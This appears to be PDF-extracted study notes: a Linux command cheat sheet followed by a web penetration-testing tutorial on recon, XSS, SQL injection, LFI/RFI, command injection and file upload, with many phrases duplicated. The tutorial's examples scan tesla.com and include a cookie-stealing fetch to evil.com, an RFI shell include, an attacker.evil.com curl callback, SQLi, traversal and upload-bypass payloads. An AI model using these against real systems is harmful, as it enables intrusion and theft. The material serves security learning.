Nayana 1. User and Group Management ● useradd - Add a new user ● usermod - Modify user account ● userdel - Delete a user ● groupadd - Add a new group ● groupdel - Delete a group ● chgrp - Change group ownership of a file ● passwd - Change user password ● Who - Who is logged in 2. File and Directory Management ● ls - List directory contents ● cd - Change directory ● pwd - Print working directory ● mkdir - Make a new directory ● rmdir - Remove a directory ● rm - Remove files or directories ● cp - Copy files or directories ● mv - Move or rename files or directories 1

Nayana ● touch - Create empty files ● find - Search for file in a directory hierarchy ● locate- Find files by name 3. File Management ● cat - Concatenate and display file contents ● more - View file content page by page ● less - View file content with navigation ● head - View the first part of a file ● tail - View the last part of a file ● nano - Text editor to edit files ● vi - Text editor to edit files ● touch - Create an empty file or update file timestamp ● ln - Create hard or symbolic links ● file - Determine file type ● stat - Display file or file system status ● find - Search for files
file type ● stat - Display file or file system status ● find - Search for files in a directory hierarchy ● locate - Find files by name (using a database) 2

Nayana ● updatedb - Update the database used by locate ● xargs - Build and execute command lines from standard input 4. File Permissions and Ownership ● chmod - Change file permissions ● chown - Change file owner and group ● chgrp - Change group ownership ● umask - Set file creation mask ● getfacl - Get file access control lists (ACL) ● setfacl - Set file access control lists (ACL) ● ls -l - List files with detailed permissions, owner, and group ● stat - Display file or file system status ● acl - View or modify Access Control Lists (ACL) on files 5.

file system status ● acl - View or modify Access Control Lists (ACL) on files 5. Disk Management ● df - Display free disk space ● du - Estimate file space usage ● fdisk - Partition table manipulator ● parted - A tool for creating and managing disk partitions 3

Nayana ● lsblk - List information about block devices ● blkid - Find or display block device attributes ● mount - Mount a file system ● umount - Unmount a file system ● mkfs - Create a file system ● fsck - Check and repair file systems ● tune2fs - Adjust tunable file system parameters ● resize2fs - Resize an ext2, ext3, or ext4 file system ● lvcreate - Create a logical volume ● vgcreate - Create a volume group ● pvcreate - Prepare a physical volume for LVM ● lsattr - List file attributes on a file system ● chattr - Change file attributes on a file system 6.

ttributes on a file system ● chattr - Change file attributes on a file system 6. Process Management ● ps - Display current processes ● top - Display dynamic process information ● htop - Interactive process viewer 4

Nayana ● kill - Terminate a process by ID ● killall - Kill all processes by name ● bg - Resume a suspended process in the background ● fg - Bring a process to the foreground ● nice - Set process priority ● renice - Change the priority of running processes ● jobs - List active jobs ● pgrep - Search for processes by name or other attributes ● pkill - Kill processes by name or other attributes ● pstree - Display processes in a tree format ● lsof - List open files and the processes that opened them ● strace - Trace system calls and signals ● timeout - Run a command with a time limit ● watch -

e system calls and signals ● timeout - Run a command with a time limit ● watch - Execute a program periodically and show output 7. Network Management ● ifconfig - Display and configure network interfaces ● ip a - Show all network interfaces and their IPs ● ip r - Display the routing table 5

Nayana ● ip link set <interface> up/down - Enable or disable a network interface ● ping <host> - Send ICMP echo request to check connectivity ● traceroute <host> - Trace the route packets take to a network host ● netstat -tulnp - Show open ports and listening services ● ss -tulnp - Display socket statistics and listening services ● hostname -I - Show the system’s IP address ● dig <domain> - Query DNS records ● nslookup <domain> - Lookup DNS details ● whois <domain> - Get domain registration details ● curl -I <URL> - Fetch HTTP headers from a website ● wget <URL> - Download files from the web

> - Fetch HTTP headers from a website ● wget <URL> - Download files from the web ● scp <file> user@host:/path - Securely copy files over SSH ● rsync -avz <src> <dest> - Sync files between local and remote locations ● tcpdump -i eth0 - Capture network packets on an interface ● nmap <IP> - Scan a network for open ports 8. System and Monitoring ● uptime - Show system uptime and load average 6

Nayana ● dmesg - Print system boot and hardware logs ● free -m - Display memory usage in MB ● vmstat - Report system performance statistics ● iostat - Display CPU and disk I/O statistics ● mpstat - Show CPU usage per core ● top - Display dynamic process and system information ● htop - Interactive process and resource monitoring ● sar -u 5 10 - Monitor CPU usage at 5-second intervals ● iotop - Display disk read/write usage per process ● lsof - List open files by processes ● watch -n 2 <command> - Run a command every 2 seconds ● journalctl -xe - View system logs with extended details ●

mand every 2 seconds ● journalctl -xe - View system logs with extended details ● systemctl status <service> - Check the status of a service ● service <service> status - View service status (legacy systems) ● df -h - Show disk space usage in a human-readable format ● du -sh <directory> - Display the size of a directory ● ps aux --sort=-%mem - List processes sorted by memory usage ● netstat -tulnp - Show active network connections and listening services 7

Nayana 9. Text Processing ● cat <file> - Display file contents ● tac <file> - Display file contents in reverse order ● head -n <num> <file> - Show the first <num> lines of a file ● tail -n <num> <file> - Show the last <num> lines of a file ● tail -f <file> - Continuously display new lines in a file ● grep '<pattern>' <file> - Search for a pattern in a file ● grep -r '<pattern>' <directory> - Recursively search for a pattern in a directory ● awk '{print $1, $2}' <file> - Process and extract columns from a file ● sed 's/old/new/g' <file> - Replace text in a file ● cut -d':' -f1 <file> - Extract

d 's/old/new/g' <file> - Replace text in a file ● cut -d':' -f1 <file> - Extract specific fields from a file ● sort <file> - Sort file contents ● uniq <file> - Remove duplicate lines from a file ● wc -l <file> - Count lines in a file ● wc -w <file> - Count words in a file ● wc -c <file> - Count bytes in a file ● tr 'a-z' 'A-Z' <file> - Convert lowercase to uppercase ● diff <file1> <file2> - Compare two files line by line 8

Nayana ● cmp <file1> <file2> - Compare two files byte by byte ● tee <file> - Read from standard input and write to both a file and standard output 10. Package Management For Debian-based systems (Ubuntu, Debian) ● apt update - Update package lists ● apt upgrade - Upgrade all installed packages ● apt install <package> - Install a package ● apt remove <package> - Remove a package ● apt purge <package> - Remove a package and its config files ● dpkg -i <package>.deb - Install a .deb package ● dpkg -r <package> - Remove a package installed via dpkg ● dpkg -l - List installed packages ● apt-cache

ove a package installed via dpkg ● dpkg -l - List installed packages ● apt-cache search <package> - Search for a package ● apt autoremove - Remove unnecessary packages ● apt clean - Clear the package cache For RHEL-based systems (CentOS, Rocky Linux, AlmaLinux, Fedora) ● yum update - Update installed packages (for older systems) 9

Nayana ● dnf update - Update installed packages (for newer systems) ● yum install <package> - Install a package ● dnf install <package> - Install a package (newer distros) ● yum remove <package> - Remove a package ● dnf remove <package> - Remove a package (newer distros) ● rpm -ivh <package>.rpm - Install an .rpm package ● rpm -e <package> - Remove an installed .rpm package ● yum list installed - List installed packages ● dnf list installed - List installed packages (newer distros) ● yum search <package> - Search for a package ● dnf search <package> - Search for a package (newer distros) ●

ch for a package ● dnf search <package> - Search for a package (newer distros) ● yum clean all - Clean cached package data 11. Archive and Compression Working with tar files ● tar -cvf archive.tar <files> - Create a tar archive ● tar -xvf archive.tar - Extract a tar archive ● tar -tvf archive.tar - List files in a tar archive 10

Nayana ● tar -czvf archive.tar.gz <files> - Create a compressed tar.gz archive ● tar -xzvf archive.tar.gz - Extract a tar.gz archive ● tar -cJvf archive.tar.xz <files> - Create a tar.xz archive ● tar -xJvf archive.tar.xz - Extract a tar.xz archive Working with zip files ● zip archive.zip <files> - Create a zip archive ● unzip archive.zip - Extract a zip archive ● unzip -l archive.zip - List contents of a zip file ● zip -r archive.zip <directory> - Zip a directory Working with gzip & bzip2 ● gzip <file> - Compress a file using gzip ● gunzip <file>.gz - Decompress a gzip file ● bzip2 <file> -

s a file using gzip ● gunzip <file>.gz - Decompress a gzip file ● bzip2 <file> - Compress a file using bzip2 ● bunzip2 <file>.bz2 - Decompress a bzip2 file 12. Shutdown and Reboot ● shutdown -h now - Shutdown the system immediately ● shutdown -h +10 - Shutdown the system in 10 minutes 11

Nayana ● shutdown -h 22:00 - Schedule shutdown at 10:00 PM ● shutdown -c - Cancel a scheduled shutdown ● poweroff - Immediately power off the system ● halt - Halt the system ● reboot - Reboot the system immediately ● shutdown -r now - Reboot the system immediately ● shutdown -r +5 - Reboot the system in 5 minutes ● systemctl reboot - Reboot using systemd 13.

5 - Reboot the system in 5 minutes ● systemctl reboot - Reboot using systemd 13. Task Scheduling ● crontab -e - Edit cron jobs for the current user ● crontab -l - List scheduled cron jobs ● crontab -r - Remove all cron jobs for the current user ● crontab -u <user> -l - List cron jobs for a specific user ● at <time> - Schedule a command to run at specified time 14. System Diagnostics and Troubleshooting ● journalctl -xe - View detailed system logs ● journalctl -f - Follow live logs in real-time 12

Nayana ● journalctl --since "1 hour ago" - View logs from the last hour ● dmesg | less - View system boot logs ● dmesg | grep error - Check for errors in system logs ● cat /var/log/syslog - View general system logs (Debian-based) ● cat /var/log/messages - View general system logs (RHEL-based) ● uptime - Show system uptime and load ● free -m - Display available and used memory in MB ● top - Monitor real-time CPU, memory, and process usage ● htop - Interactive system monitoring (if installed) ● vmstat 1 5 - Display system performance stats ● iostat - Show CPU and disk usage statistics 13

What is Information Gathering? Information Gathering, also known as reconnaissance, is the first step in web application penetration testing. The goal is to collect as much information as possible about the target without triggering any alarms or The goal is to collect as much information as possible about the target without triggering any alarms or performing intrusive actions.

about the target without triggering any alarms or performing intrusive actions. This step is divided into two parts: Passive Reconnaissance – Collecting data without directly interacting with the target server Active Reconnaissance – Interacting with the server or application to get more detailed insights

Passive Reconnaissance WHOIS Lookup WHOIS Lookup Purpose: Find information about the domain registration, including registrar, name servers, creation date, and sometimes emails. Command: Command: whois tesla.com whois tesla.com What to look for: Registrar info Registrar info Administrative email (used in social engineering or email takeover) Domain creation and expiry (useful in phishing or clone testing) Name servers (may point to hidden infrastructure)

Passive Reconnaissance DNS Enumeration DNS Enumeration Purpose: Discover subdomains, mail servers, and DNS records related to the domain. Command (to find A record): dig tesla.com dig tesla.com Command (to find all records): dig tesla.com ANY Command (to get name servers): nslookup -type=ns tesla.com What to look for: A record: main IP address MX record: mail servers TXT record: sometimes contains useful info like SPF, Google verification

Passive Reconnaissance Subdomain Enumeration (Passive) Purpose: Identify subdomains that may be hosted on separate servers or expose different applications. Command using crt.sh (via browser): https://crt.sh/?q=%.tesla.com https://crt.sh/?q=%.tesla.com Command using Subfinder: subfinder -d tesla.com -silent Command using Assetfinder: assetfinder --subs-only tesla.com What to look for: dev.tesla.com (development servers) staging.tesla.com staging.tesla.com shop.tesla.com shop.tesla.com forums.tesla.com forums.tesla.com Anything not pointing to the main app is interesting

Active Reconnaissance HTTP Header and Response Analysis Purpose: Check security headers, server technologies, and cookie behavior. Command: Command: curl -I https://www.tesla.com What to look for: Server headers: may reveal Apache, Nginx, or cloud providers Set-Cookie: Secure, HttpOnly, SameSite attributes X-Powered-By: Technology used (e.g., PHP, Express)

Active Reconnaissance Directory and File Enumeration Purpose: Find hidden pages or directories not linked from the homepage. Command: Command: ffuf -u https://www.tesla.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 403,404 -t 50 What to look for: /admin /admin /backup /backup /login /login /api/api /dev/dev Use wordlists from SecLists (apt install seclists).

Active Reconnaissance Technology and Framework Detection Purpose: Identify which frameworks, libraries, and platforms the site uses. Tools: Tools: Wappalyzer (Browser Extension) BuiltWith BuiltWith whatweb whatweb httpx with tech detection Command using whatweb: whatweb https://www.tesla.com whatweb https://www.tesla.com What to look for: CMS: WordPress, Drupal JavaScript libraries: React, Angular, Vue Backend: ASP.NET, Node.js, PHP

What is a Spider in Web Pentesting? A spider (also called a crawler) is an automated tool or feature that browses and maps all reachable pages, links, and inputs A spider (also called a crawler) is an automated tool or feature that browses and maps all reachable pages, links, and inputs in a web application. Purpose of a Spider Discover all available endpoints (URLs) FFind hidden or unlinked pages ind hidden or unlinked pages Enumerate parameters automatically Build a complete attack surface for testing

Tools for Spidering Burp Suite (Spider is built-in with Target > Site Map) OWASP ZAP (Automated spider) hakrawler – CLI-based crawler gau – Fetches known URLs from public archives (e.g., Wayback Machine)

How to Use Spider in Burp Suite Open Burp Suite Proxy > Intercept ON Browse the target application manually Go to Target > Site Map — you’ll see all pages discovered RiRight-click the domain > Spider this host ght-click the domain > Spider this host Output - Output - All pages and parameters Automatically discovers hidden input forms, login panels, etc.

What Are Parameters? Parameters are data sent from the client to the server to perform an action or fetch specific information. They can be found in - URL (GET) – example.com/page.php?id=123 Body (POST) – sent via form data Headers – like Authorization, X-Requested-With Cookies – session IDs, tokens

Why Parameters Are Important in Pentesting They represent entry points for user input, whic They represent entry points for user input, which can be exploited if not properly validated or sanitized. h can be exploited if not properly validated or sanitized. TTesting parameters is key for finding: esting parameters is key for finding: SQL Injection SQL Injection XSSXSS LFI/RFI LFI/RFI Command Injection Command Injection IDOR (Insecure Direct Object Reference) CSRF CSRF Open Redirects Open Redirects

How to Find Parameters Passive Discovery Passive Discovery Burp Suite: Browse th Burp Suite: Browse the site → look in HTTP History e site → look in HTTP History Browser Dev Tools: Inspect Network Tab Spider Spider Tools: Burp Spider, OWASP ZAP, hakrawler, gau Archived URL Fetchers (for hidden params) gau tesla.com gau tesla.com This pulls archived URLs like: https://www.tesla.com/search?query=model3 https://www.tesla.com/search?query=model3 https://www.tesla.com/inventory?location=NY&id=9876 https://www.tesla.com/inventory?location=NY&id=9876

What is XSS (Cross-Site Scripting) XSS, or Cross-Site Scripting, is a vulnerability tha that allows an attacke t allows an attacker to inject mali r to inject malicious cious scripts into a website viewed by other users. It’s a client-side attack because it targets users scripts into a website viewed by other users. It’s a client-side attack because it targets users through their browsers, not the server directly. However, it can indirectly impact servers and business operations if not handled properly.

t can indirectly impact servers and business operations if not handled properly. Types of XSS - Stored XSS Stored XSS The malicious script is permanently stored stored on the serve on the server (for example, in a r (for example, in a comment or post) and is executed every time a user loads the page. Reflected XSS Reflected XSS The script is part of the URL or request and is immediately reflected back in the response. It’s commonly delivered via phishing links. The script is part of the URL or request and is immediately reflected back in the response.

is part of the URL or request and is immediately reflected back in the response. DOM-Based XSS DOM-Based XSS This happens entirely in the browser through JavaScript and client-side processing. The server may not even be aware of it. This happens entirely in the browser through JavaScript and client-side processing.

Where to Find XSS You should look for XSS in any fea feature whe ture where re user input is reflected or rendered on a web page, such as: Search boxes Search boxes Comment forms Comment forms Contact forms Contact forms Feedback submissions Feedback submissions URL parameters URL parameters Page titles and messages API responses returned in the browser

How XSS Occurs When user input is not properly sanitized or encoded, attackers can inject JavaScript payloads into the application. For example, if an attacker inputs a script like <script>alert('XSS')</script> and it's rendered in the page without filtering, that code will execute in the user's browser. Why XSS is Called a Client-Side Attack Because the malicious script runs in the victim's browser, not on the server. It uses the Because the malicious script runs in the victim's browser, not on the server.

he Because the malicious script runs in the victim's browser, not on the server. It uses the victim's session or actions to perform harmful activities, like stealing cookies, redirecting to phishing sites, or logging keystrokes.

Real-World Example Imagine a car company website like examplecars.com that shows reviews submitted by users. If it doesn't filter user input properly, an attacker could submit this as a review: users. If it doesn't filter user input properly, an attacker could submit this as a review: <script>fetch('http://evil.com?cookie=' + document.cookie)</script> Now, every user who reads that review will unknowingly send their session cookie to the attacker's server. attacker's server.

How Attackers Steal Cookies and Data Using XSS The attacker injects a JavaScript payload that runs in the victim's browser. The script accesses document.cookie or form data. It sends that data to an external server controlled by the attacker. If session cookies are stolen, the attacker can impersonate the user. Impact on Business User trust loss: If users get pop-ups or are redirected, they stop trusting the site. SSession hijacking: Attackers can impersonate users, including admins. ession hijacking: Attackers can impersonate users, including admins.

ing admins. ession hijacking: Attackers can impersonate users, including admins. Data theft: Sensitive data like email addresses, passwords, or credit card numbers can be stolen. Reputation damage: News of XSS incidents can affect customer confidence and investor trust. Compliance violations: Companies may face legal action or penalties under privacy laws (like GDPR).

How to Find XSS Vulnerabilities Manual Testing: Manual Testing: Look for input fields and try payloads like , , etc. onerror=alert(1)>, etc. Observe if the input is reflected in the response unencoded. Use browser developer tools to inspect the response and DOM changes. Automated Tools: Automated Tools: BuBurp Suite (intruder, repeater) rp Suite (intruder, repeater) OWASP ZAP OWASP ZAP XSStrike XSStrike Your own crawler to extract parameters and test payloads

Steps to Perform Testing: Use Burp Suite or browser dev t Use Burp Suite or browser dev tools to intercept and test user inputs. ools to intercept and test user inputs. Inject common payloads in query parameters and form inputs. Observe whether your payload is reflected in the HTML response. ChCheck if the script executes in the browser. eck if the script executes in the browser. Try using advanced payloads to bypass filters.

What is SQL Injection SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It happens when user input is inserted directly into SQL statements without proper validation or sanitization. This allows attackers to read, modify, or even delete sensitive data.

How SQL Injection Occurs Most web applications interact with databases to fetch or store user data (e.g., login forms, search boxes). If the application does not filter or parameterize the input properly, an attacker can inject SQL code into the input fields. application does not filter or parameterize the input properly, an attacker can inject SQL code into the input fields.

erize the input properly, an attacker can inject SQL code into the input fields. Example vulnerable query: SELECT * FROM users WHERE username = 'input' AND password = 'input' If an attacker provides: username: ' OR 1=1 -- password: anything password: anything The final query becomes: SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything' This bypasses authentication and logs in the attacker.

Where to Find SQL Injection You can test for SQL injection anywhere the web application interacts with the database: LLogin forms ogin forms Signup forms Signup forms Search fields Search fields Product filters Product filters URLs with numeric or string parameters Hidden fields Hidden fields HHeadeaders like User-Agent or Referer (in some APIs) ers like User-Agent or Referer (in some APIs)

Types of SQL Injection Classic/Union-based SQLi Classic/Union-based SQLi Injecting malicious queries that retrieve data by using UNION SELECT. Example payload: ' UNION SELECT null, version(), database() -- Error-Based SQLi Error-Based SQLi Forces the database to throw errors revealing information. Payload: ' OR 1=1 ORDER BY 9999 -- Boolean-Based Blind SQLi Application doesn't show errors, but responses differ for true/false conditions. Payload: ' AND 1=1 -- vs ' AND 1=2 -- Time-Based Blind SQLi The attacker uses database delays to infer results.

1=2 -- Time-Based Blind SQLi The attacker uses database delays to infer results. Payload: ' OR IF(1=1, SLEEP(5), 0) -- Out-of-Band SQLi Out-of-Band SQLi Uses DNS or HTTP requests from the DB server to exfiltrate data. Requires advanced setups and supported DB functions.

How Attackers Exploit SQL Injection Bypass login: Gain unauthorized access to accounts to accounts Extract data: Steal usernames, passwords, emails, credit cards MModify data: Change prices, account balances, or user roles odify data: Change prices, account balances, or user roles Delete data: Drop tables or entire databases entire databases RCE: On some DBMS (like MySQL + file write or MSSQL + xp_cmdshell), attackers can gain remote command RCE: On some DBMS (like MySQL + file write or MSSQL + xp_cmdshell), attackers can gain remote command execution execution

Real-World Example Suppos Suppose a website like carslisting.com/search.php?car=toyota doesn't filter inputs. e a website like carslisting.com/search.php?car=toyota doesn't filter inputs. If the attacker visits: carslisting.com/search.php?car=toyota' OR 1=1 -- They may get the full database results. If the site uses: SELECT * FROM cars WHERE brand = '$car' Then the payload directly modifies the logic of the SQL query.

Impact of SQL Injection Data Theft: Custom Data Theft: Customer, financial, and sensitive records exposed er, financial, and sensitive records exposed Data Corruption or Loss: Attackers can modify or delete data Account Takeover: Bypass logins, elevate privileges Business Loss: Legal issues, loss of customer trust, regulatory fines Full System Compromise: Leads to remote code execution on server

How to Detect SQL Injection Add ' or " in input fields. See if errors appear. Use payloads like: ' OR '1'='1 ' UNION SELECT NULL, version(), user() -- ' AND SLEEP(5) -- Observe: Observe: Database errors Database errors Behavior changes (true/false logic) Page delays (for time-based)

How to Use sqlmap Capture a requ Capture a request using Burp Suite or browser est using Burp Suite or browser SSave it as request.txt ave it as request.txt Run:Run: sqlmap -r request.txt --batch --dbs This will test and list all accessible databases if the input is vulnerable.

What is LFI (Local File Inclusion) Local File Inclusion is a vuln Local File Inclusion is a vulnerability that allows an attacker to read local files from the server. It erability that allows an attacker to read local files from the server. It occurs when the application include occurs when the application includes a file based on user input, but does not properly validate or s a file based on user input, but does not properly validate or sanitize the path.

a file based on user input, but does not properly validate or sanitize the path. This lets attackers read sensitive files such as - /etc/passwd /etc/passwd /proc/self/environ /proc/self/environ Log files (/var/log/apache2/access.log) Application source code Credentials or configuration files

What is RFI (Remote File Inclusion) Remote File Inclusion is a mo Remote File Inclusion is a more dangerous version of file inclusion. It happens when the re dangerous version of file inclusion. It happens when the application accept application accepts a remote file URL as input and includes it into the server code. s a remote file URL as input and includes it into the server code. This allows This allows attackers to execute remote code from their own server. RemRemote File Inclusion usually affects PHP-based applications with allow_url_include = On.

le Inclusion usually affects PHP-based applications with allow_url_include = On. ote File Inclusion usually affects PHP-based applications with allow_url_include = On. How LFI and RFI Work These vulnerabilities a These vulnerabilities are commonly found in dynamic file inclusion functions in web application re commonly found in dynamic file inclusion functions in web applications,s, such as: such as: include($_GE include($_GET["page"]) (PHP) T["page"]) (PHP) require("views/" . $_GET["file"])

Where to Look for LFI/RFI Look for pa Look for parameters that include filenames or paths in: rameters that include filenames or paths in: ppage=age= file=file= template= template= lang= lang= view= view= ddir=ir= Example URLs: Example URLs: example.com/index.php?page=home example.com/index.php?page=home examp example.com/view.php?file=about.html le.com/view.php?file=about.html

How LFI Happens URL: URL: http://example.com/index.php?page= http://example.com/index.php?page=about about Code: Code: include($_GET["page"] . ".php") AttAttacker input: acker input: htthttp://example.com/index.php?page=../../../../etc/passwd p://example.com/index.php?page=../../../../etc/passwd Server processes: Server processes: include("../../../../etc/passwd.php") include("../../../../etc/passwd.php") By removing the extension or by using null byte injection in older PHP versions, attackers can access the By removing the extension or by using null byte injection in older PHP versions,
By removing the extension or by using null byte injection in older PHP versions, attackers can access the actual file: actual file: ?page=../../../../etc/passwd%00 ?page=../../../../etc/passwd%00

How RFI Happens URL: URL: http://example.com/index.php?page=http://evil.c http://example.com/index.php?page=http://evil.com/shell.txt om/shell.txt Code: Code: include($_GET["page"]) include($_GET["page"]) IfIf allow_u allow_url_rl_include is enabled, the server will download and execute code from the attacker's site. include is enabled, the server will download and execute code from the attacker's site.

What an Attacker Can Do with LFI & RFI LFI -LFI - Read sensitive server file Read sensitive server filess Leak credentials, tokens, or config ReadRead application sou application source rce codecode Log poisoning: Inject PHP into logs and then include log files Get code execution (via /proc/self/environ, log poisoning, etc.) Enumerate directories and files RFI -RFI - Upload a reverse shell Execute remote commands Fully compromise the server Pivot into internal networks Drop malware or ransomware

Why LFI and RFI Are Dangerous LFI can le LFI can lead to inform ad to information disclosu ation disclosure,re, privilege escalation, and even RCE RFI leads directly to Remote Code Execution (if server is vulnerable) Both are often underrated and overlooked by developers

Real-World LFI Example URL: URL: http://targe http://target.com/pag t.com/page.e.php?file=../../../../etc/passwd php?file=../../../../etc/passwd Returns contents of /etc/passwd: root:x:0:0:root:/root:/bin/bash root:x:0:0:root:/root:/bin/bash AtAttacker then reads: tacker then reads: Apache log files SSH keys SSH keys PHP sessions PHP sessions Application .env file

Once included, server connects to a Once included, server connects to atttacker's Netcat listener and gives reverse shell. tacker's Netcat listener and gives reverse shell.

How to Detect LFI and RFI Try basic traversal: ?page=../../../../e ?page=../../../../etc/passwd tc/passwd ?file=../../../../var/log/apache2/access.log ?file=../../../../var/log/apache2/access.log Use null by Use null byte if applicable: te if applicable: ?pag?page=../../../../etc/ e=../../../../etc/passwd%00 passwd%00 Try RFI: Try RFI: ?page=http://evil.com/shell.txt ?page=http://evil.com/shell.txt Use Burp Suite Intruder to fuzz with common file paths.

Business Impact of LFI and RFI Sensitive data leak: Configs, creden Sensitive data leak: Configs, credentials, keys tials, keys SServer compromise: Full control via reverse shells or RCE erver compromise: Full control via reverse shells or RCE DDefacement or DoS: A efacement or DoS: Attackers can modify or destroy files ttackers can modify or destroy files Complianc Compliance issues: Violation e issues: Violations of GDPR, HIPAA, etc. s of GDPR, HIPAA, etc. Reputation loss: Sensitive data leak harms customer trust Monetary damage: Ransomware, lawsuits, data breach fines

Command Execution Vulnerability A Command Execution vulnerability happens when an application allows user input to be passed into a A Command Execution vulnerability happens when an application allows user input to be passed into a system command (like ls, ping, or cat) without proper sanitization. Attackers can exploit this to run arbitrary system command (like ls, ping, or cat) without proper sanitization. Attackers can exploit this to run arbitrary system commands on the target server.

ttackers can exploit this to run arbitrary system commands on the target server. This can lead to: Unauthorized access Unauthorized access Full system compromise Reverse shell connection Data theft, defacement, or lateral movement

Types of Command Execution OS Command Injection Occurs when the application passes unsanitized user input into a shell command. Example Code (PHP): system("ping -c 4 " . $_GET["host"]); If attacker sends: host=127.0.0.1; whoami host=127.0.0.1; whoami The command becomes: ping -c 4 127.0.0.1; whoami

Types of Command Execution Blind Command Execution TThe response does not return command output, but the command still gets executed in the background. he response does not return command output, but the command still gets executed in the background. Indicators: Use time-based commands like sleep 5 to observe response delay.

Where Command Execution Happens Look for paramet Look for parameters that may be passed to backend commands: ers that may be passed to backend commands: ?ip=?ip= ?host= ?host= ?target= ?target= ?cmd= ?cmd= ?domain= ?domain=

Delimiter Description & Usage ; Separates two commands – both are executed && Executes second command only if first succeeds ` ` ` %0a URL encoded newline (\n) – used in bypassing & Executes both commands in parallel $() Command substitution – runs inner command ` ` Backticks for command substitution \n Newline – sometimes injected directly >, >> Write/append output to a fileCommand Injection Delimiters Delimiters are charact Delimiters are characters used to separate multiple commands in the same input. They allow attackers to ers used to separate multiple commands in the same input.

hey allow attackers to ers used to separate multiple commands in the same input. They allow attackers to chain or inject new commands even when input is meant to be used for just one. chain or inject new commands even when input is meant to be used for just one. ListList of Common Command Delimiters

Attempt Result 127.0.0.1; whoami Basic injection 127.0.0.1 && whoami Executes only if ping works `127.0.0.1 `127.0.0.1 whoami` 127.0.0.1$(whoami) Command substitution 127.0.0.1\whoami`` Using backticks %0a whoami Newline injectionHow Delimiter Bypasses Work Some filters block only the most obvious ones like ;, but you can bypass them using alternate syntax: ExaExample Bypasses: mple Bypasses:

Blind Command Execution – How to Test If you suspect blind injection (no output shown), test with: 127.0.0.1; sleep 5 127.0.0.1 && ping -c 5 127.0.0.1 Check Check if the server takes longer to respond that confirms execution. You can also test DNS-based callbacks: 127.0.0.1; curl http://attacker.evil.com/ Use tools like Burp Collaborator or interact.sh to detect outbound requests.

Business Impact of Command Execution Full server compromise Sensitive data theft Lateral movement in internal network internal network Reputation loss & legal risk Data exfiltration or ransomware attack High-risk CVSS rating: 9.8 (Critical)

File Upload Vulnerability File upload vulnerability happens when an application allows users to upload files without properly validating the file type, content, extension, or location. Attackers can exploit this to upload malicious files validating the file type, content, extension, or location. Attackers can exploit this to upload malicious files such as web shells, scripts, or malware, leading to remote code execution, privilege escalation, or full server such as web shells, scripts, or malware, leading to remote code execution, privilege escalation, or full server compromise. compromise.

Where to Find It? Common areas to test for file upload vulnerabilities include: Profile picture or avatar uploads Document or PDF upload forms Contact or feedback forms with attachment fields Admin panels or internal portals with upload features

Real-World Example Suppose an application allows users to upload .jpg images. An attacker uploads a file named shell.php.jpg, Suppose an application allows users to upload .jpg images. An attacker uploads a file named shell.php.jpg, which actually contains PHP code. If the server only checks the extension but not the MIME type or which actually contains PHP code.

checks the extension but not the MIME type or which actually contains PHP code. If the server only checks the extension but not the MIME type or content, and if the server saves this file in a web-accessible directory, the attacker can then access content, and if the server saves this file in a web-accessible directory, the attacker can then access http://target.com/uploads/shell.php.jpg, and it executes as a PHP script, granting server access.

Types of File Upload Vulnerabilities Unrestricted File Upload No checks on file extension, type, or size Allows execution of malicious scripts Content-Type Bypass Content-Type Bypass Server relies on Content-Type header, which attackers can fake Example: sending Content-Type: image/jpeg for a PHP file Extension Bypass Extension Bypass Uploading files like file.php.jpg or file.php;.jpg Application may treat it as an image, but server executes as PHP MIME Sniffing Abuse Browser or server misinterprets file type Useful in XSS through uploaded SVG or HTML files Path Traversal in File Name If

Useful in XSS through uploaded SVG or HTML files Path Traversal in File Name If attackers can change the upload path via ../../ in file names Client-Side Validation Only If JavaScript checks the extension but server doesn’t verify

Common Impacts Remote Code Remote Code Execution: Uploading a script to gain shell access Stored XSS: Uploading a file like .svg or .html with malicious JS Denial of Service: Uploading large files to crash or fill the server Defacement: Uploading modified files to change how the website looks

How It Affects Users and Businesses User data User data theft if attacker uploads a script that steals session cookies Server compromise leading to leaked or deleted sensitive data Loss of business trust, legal consequences, and financial loss Ransomware or backdoors left on the system after initial access

How to Test and Find It Try uploading Try uploading different file types (.php, .js, .exe, .htaccess) IntIntercept file upload requests using tools like Burp Suite ercept file upload requests using tools like Burp Suite Modify extension, content-type, and filename in the request Check the upload location and try accessing the uploaded file Observe error messages or abnormal behavior during upload Use payloads with extensions like .php, .phtml, .php5, .phar

Useful Techniques Upload Upload with double extensions: shell.php.jpg Bypass co Bypass contntent-type header: change it to image/jpeg ent-type header: change it to image/jpeg UsUse known upload bypass payloads such as shell.php%00.jpg e known upload bypass payloads such as shell.php%00.jpg Try uploading scripts that echo system commands or environment details Observe the response and access the upload directory directly
